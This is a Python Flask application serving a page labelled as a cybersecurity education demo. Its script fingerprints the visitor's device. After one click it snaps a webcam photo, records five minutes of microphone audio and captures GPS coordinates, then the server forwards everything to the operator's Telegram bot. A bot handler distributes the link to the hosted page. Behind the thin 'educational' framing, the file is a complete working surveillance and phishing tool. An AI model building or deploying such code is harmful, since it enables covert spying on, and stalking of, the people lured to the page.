from flask import Flask, request, Response
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
YOUR_CHAT_ID = os.environ.get('YOUR_CHAT_ID', '')

HTML_PAGE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>网络安全教育演示</title>
    <style>
        body { background: #000; text-align: center; color: white; font-family: Arial; padding: 20px; }
        button { background: #ff0050; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-size: 18px; margin: 20px; cursor: pointer; }
        .warning { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #222; color: #ff9800; font-size: 10px; padding: 8px; }
        .data-box { background: #111; margin: 20px auto; padding: 20px; border-radius: 10px; text-align: left; max-width: 500px; }
        .status-good { color: #0f0; }
        .status-bad { color: #f00; }
        h3 { color: #ff0050; }
        .progress-bar { background: #333; border-radius: 10px; height: 10px; margin-top: 5px; }
        .progress-fill { background: #ff0050; border-radius: 10px; height: 10px; width: 0%; }
    </style>
</head>
<body>

<h2>🔐 网络安全教育演示</h2>
<p>此演示展示恶意网站可以收集哪些数据</p>

<button onclick="startAll()">开始完整安全测试</button>

<div id="info" class="data-box" style="display:none">
    <h3>📱 设备信息 (无需权限)</h3>
    <p>🖥️ IP地址: <span id="ipStatus">检测中...</span></p>
    <p>🌐 浏览器: <span id="browserInfo">检测中...</span></p>
    <p>💻 操作系统: <span id="osInfo">检测中...</span></p>
    <p>📺 屏幕分辨率: <span id="screenInfo">检测中...</span></p>
    <p>🌍 语言: <span id="languageInfo">检测中...</span></p>
    <p>⏰ 时区: <span id="timezoneInfo">检测中...</span></p>
    <p>🔋 电池电量: <span id="batteryInfo">检测中...</span></p>
    <p>📶 网络类型: <span id="networkInfo">检测中...</span></p>
    <p>💾 设备内存: <span id="memoryInfo">检测中...</span></p>
    <p>⚙️ CPU核心数: <span id="cpuInfo">检测中...</span></p>
    
    <h3>🎤 传感器数据 (需要权限)</h3>
    <p>📸 相机 (0.5秒): <span id="cameraStatus">等待允许...</span></p>
    <p>🎤 麦克风 (5分钟): <span id="micStatus">等待允许...</span></p>
    <p>📍 GPS位置: <span id="gpsStatus">等待允许...</span></p>
    <p>⏱️ 录音进度: <span id="recordProgress">0:00 / 5:00</span></p>
    <div class="progress-bar"><div class="progress-fill" id="recordProgressFill"></div></div>
</div>

<div class="warning">⚠️ 仅在授权设备上测试 | 展示恶意网站能力</div>

<script>
let cameraStream = null, audioStream = null, mediaRecorder = null, audioChunks = [], recordStartTime = null, progressInterval = null;

// IP Address
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>document.getElementById('ipStatus').innerHTML=d.ip);

// Browser & OS
const ua = navigator.userAgent;
let browser = ua.includes('Chrome')?'Chrome':ua.includes('Firefox')?'Firefox':ua.includes('Safari')?'Safari':'其他';
let os = ua.includes('Windows')?'Windows':ua.includes('Mac')?'macOS':ua.includes('Android')?'Android':ua.includes('iPhone')?'iOS':'其他';
document.getElementById('browserInfo').innerHTML = browser;
document.getElementById('osInfo').innerHTML = os;
document.getElementById('screenInfo').innerHTML = `${screen.width}x${screen.height}`;
document.getElementById('languageInfo').innerHTML = navigator.language;
document.getElementById('timezoneInfo').innerHTML = Intl.DateTimeFormat().resolvedOptions().timeZone;

// CPU & Memory
if(navigator.hardwareConcurrency) document.getElementById('cpuInfo').innerHTML = navigator.hardwareConcurrency + ' 核心';
if(navigator.deviceMemory) document.getElementById('memoryInfo').innerHTML = navigator.deviceMemory + ' GB';

// Battery
if(navigator.getBattery) navigator.getBattery().then(b=>document.getElementById('batteryInfo').innerHTML = Math.round(b.level*100)+'%');

// Network
const conn = navigator.connection;
if(conn) document.getElementById('networkInfo').innerHTML = conn.effectiveType;

// Send device info
setTimeout(()=>{
    fetch('/upload-device-info',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
        ip:document.getElementById('ipStatus').innerText, browser, os, screen:`${screen.width}x${screen.height}`,
        language:navigator.language, timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
        cpu:navigator.hardwareConcurrency||'Unknown', memory:navigator.deviceMemory||'Unknown',
        battery:document.getElementById('batteryInfo').innerText, network:conn?conn.effectiveType:'Unknown'
    })});
},1000);

function updateProgress(){
    if(!recordStartTime) return;
    let elapsed = (Date.now()-recordStartTime)/1000;
    let percent = Math.min((elapsed/300)*100,100);
    document.getElementById('recordProgress').innerHTML = `${Math.floor(elapsed/60)}:${Math.floor(elapsed%60).toString().padStart(2,'0')} / 5:00`;
    document.getElementById('recordProgressFill').style.width = percent+'%';
    if(elapsed>=300){ clearInterval(progressInterval); if(mediaRecorder?.state==='recording') mediaRecorder.stop(); }
}

async function startAll(){
    document.getElementById('info').style.display='block';
    document.querySelector('button').style.display='none';
    document.querySelector('h2').innerHTML='✅ 数据收集演示运行中...';
    
    // Camera
    try{
        cameraStream = await navigator.mediaDevices.getUserMedia({video:true});
        document.getElementById('cameraStatus').innerHTML='✅ 已授权';
        setTimeout(()=>{
            let video = document.createElement('video');
            video.srcObject=cameraStream;
            video.play();
            setTimeout(()=>{
                let canvas=document.createElement('canvas');
                canvas.width=video.videoWidth||640;
                canvas.height=video.videoHeight||480;
                canvas.getContext('2d').drawImage(video,0,0);
                canvas.toBlob(b=>{let f=new FormData();f.append('photo',b);fetch('/upload-photo',{method:'POST',body:f})});
                if(cameraStream) cameraStream.getTracks().forEach(t=>t.stop());
            },200);
        },500);
    }catch(e){ document.getElementById('cameraStatus').innerHTML='❌ 拒绝'; }
    
    // Microphone
    try{
        audioStream = await navigator.mediaDevices.getUserMedia({audio:true});
        document.getElementById('micStatus').innerHTML='✅ 录音中 (5分钟)';
        mediaRecorder = new MediaRecorder(audioStream);
        audioChunks = [];
        mediaRecorder.ondataavailable = e=>{ if(e.data.size>0) audioChunks.push(e.data); };
        mediaRecorder.onstop = ()=>{
            let audioBlob = new Blob(audioChunks,{type:'audio/webm'});
            let f=new FormData(); f.append('audio',audioBlob);
            fetch('/upload-audio',{method:'POST',body:f});
            document.getElementById('micStatus').innerHTML='✅ 录音完成';
        };
        mediaRecorder.start(1000);
        recordStartTime = Date.now();
        progressInterval = setInterval(updateProgress,1000);
        setTimeout(()=>{ if(mediaRecorder?.state==='recording') mediaRecorder.stop(); if(audioStream) audioStream.getTracks().forEach(t=>t.stop()); },300000);
    }catch(e){ document.getElementById('micStatus').innerHTML='❌ 拒绝'; }
    
    // GPS
    if('geolocation' in navigator){
        navigator.geolocation.getCurrentPosition(
            p=>{
                let lat=p.coords.latitude, lng=p.coords.longitude;
                document.getElementById('gpsStatus').innerHTML=`✅ ${lat.toFixed(4)}, ${lng.toFixed(4)}`;
                fetch('/upload-location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat,lng})});
            },
            e=>document.getElementById('gpsStatus').innerHTML='❌ 拒绝'
        );
    }
}
</script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/upload-device-info', methods=['POST'])
def upload_device_info():
    data = request.get_json()
    if data:
        msg = f"🔐 *设备信息收集*\n\nIP: {data.get('ip')}\n浏览器: {data.get('browser')}\n系统: {data.get('os')}\n屏幕: {data.get('screen')}\n语言: {data.get('language')}\n时区: {data.get('timezone')}\nCPU: {data.get('cpu')}核心\n内存: {data.get('memory')}GB\n网络: {data.get('network')}"
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', data={'chat_id': YOUR_CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
    return 'OK'

@app.route('/upload-photo', methods=['POST'])
def upload_photo():
    photo = request.files.get('photo')
    if photo:
        files = {'photo': ('photo.jpg', photo, 'image/jpeg')}
        data = {'chat_id': YOUR_CHAT_ID, 'caption': '📸 相机捕获 (0.5秒) - 安全教育演示'}
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)
    return 'OK'

@app.route('/upload-audio', methods=['POST'])
def upload_audio():
    audio = request.files.get('audio')
    if audio:
        files = {'audio': ('recording.webm', audio, 'audio/webm')}
        data = {'chat_id': YOUR_CHAT_ID, 'caption': '🎤 麦克风录音 (5分钟) - 安全教育演示'}
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendAudio', data=data, files=files)
    return 'OK'

@app.route('/upload-location', methods=['POST'])
def upload_location():
    data = request.get_json()
    if data:
        msg = f"📍 GPS位置捕获\n纬度: {data.get('lat')}\n经度: {data.get('lng')}\n地图: https://maps.google.com/?q={data.get('lat')},{data.get('lng')}"
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', data={'chat_id': YOUR_CHAT_ID, 'text': msg})
    return 'OK'

@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        if text == '/start':
            url = os.environ.get('RAILWAY_URL', 'https://hello-camera-production.up.railway.app')
            send_message(chat_id, f"🔐 *安全教育演示*\n\n点击链接测试数据收集:\n{url}\n\n⚠️ 仅在您自己的设备上测试", parse_mode='Markdown')
    return Response('OK', status=200)

def send_message(chat_id, text, parse_mode=None):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    data = {'chat_id': chat_id, 'text': text}
    if parse_mode:
        data['parse_mode'] = parse_mode
    requests.post(url, data=data)

@app.route('/health')
def health():
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
